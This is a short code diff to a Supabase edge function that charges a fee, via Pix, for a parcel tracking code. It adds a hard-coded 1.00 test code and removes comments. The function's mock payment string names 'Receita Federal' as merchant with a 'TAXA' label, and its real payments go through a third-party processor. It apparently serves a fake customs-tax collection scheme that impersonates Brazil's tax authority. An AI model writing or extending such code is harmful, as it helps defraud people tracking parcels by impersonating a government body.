@@ -13,7 +13,7 @@ serve(async (req) => {
     const { trackingCode } = await req.json();
     if (!trackingCode) throw new Error("Tracking code is required");
 
-    const amount = (trackingCode === 'BR00000001BR' || trackingCode === 'BR9999K999BR') ? 1.00 : 15.90;
+    const amount = (trackingCode === 'BR00000001BR' || trackingCode === 'BR9999K999BR' || trackingCode === 'BR1111S111BR') ? 1.00 : 15.90;
 
     const supabase = createClient(
       Deno.env.get('SUPABASE_URL') ?? '',
@@ -38,7 +38,6 @@ serve(async (req) => {
 
     const apiKey = Deno.env.get('ROYALBANKING_API_KEY');
 
-    // MOCK / FALLBACK
     const generateMockPix = async () => {
       const mockId = "mock_tax_" + Date.now();
       const mockPix = "00020101021126580014br.gov.bcb.pix0136123e4567-e89b-12d3-a456-4266141740005204000053039865405" + amount.toFixed(2) + "5802BR5913Receita Federal6008Brasilia62140510TAXA" + Date.now() + "6304A1B2";
@@ -67,7 +66,6 @@ serve(async (req) => {
           "telefone": clientTel,
           "email": clientEmail
         },
-        // IDENTIFICADOR EXCLUSIVO NA URL
         "callbackUrl": `https://ulrigywayovxuyiktnlr.supabase.co/functions/v1/royal-banking-webhook?origin=rastrear_oficial`
       };
 
